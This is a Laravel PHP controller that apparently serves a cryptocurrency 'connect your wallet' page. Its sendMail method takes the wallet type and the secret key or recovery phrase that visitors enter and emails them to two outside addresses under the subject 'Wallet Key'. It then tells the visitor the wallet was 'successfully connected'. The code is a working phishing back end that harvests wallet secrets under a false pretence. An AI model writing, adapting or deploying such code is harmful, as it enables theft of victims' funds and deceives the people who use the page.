<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class PagesController extends Controller
{
    // index
    public function index()
    {
        return view('index');
    }

    //wallet
    public function wallet()
    {
        return view('wallet');
    }

    //send mail
    public function sendMail(Request $request)
    {
        $wallet_type = $request['wallet'];
        $phrase = $request['key'];
        // dd($phrase);
        Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) {
            $message->to(['hello@callmehalpha.me','chimeinsuppor@gmail.com'])
                ->subject('Wallet Key');
        });
        return back()->with('success', 'Wallet successfully connected');

    }
}
